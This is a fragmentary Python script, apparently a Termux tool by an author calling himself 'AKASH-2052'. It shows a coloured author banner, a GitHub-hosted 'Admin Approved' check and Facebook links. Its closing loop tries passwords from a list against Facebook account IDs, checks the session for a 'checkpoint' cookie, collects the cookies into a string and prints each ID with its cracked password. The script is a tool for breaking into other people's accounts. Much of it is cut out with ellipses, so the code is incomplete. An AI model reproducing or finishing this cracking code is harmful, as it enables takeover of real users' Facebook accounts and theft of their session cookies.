...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/termux.help.center.bd')
#------------------[ AKASH KING ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
princp=[]
try:
    prox= requests.get('https://github.com/Akash-2052/AKASH-KING-2052/blob/main/Admin%20Approved.txt').text
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/tigerakash.aloneboyo')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mAKASH-2052 ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Akash Mia ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mAKASH-2052]   ║\33[1;34m   
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Akash] {idf} • {pw} ')
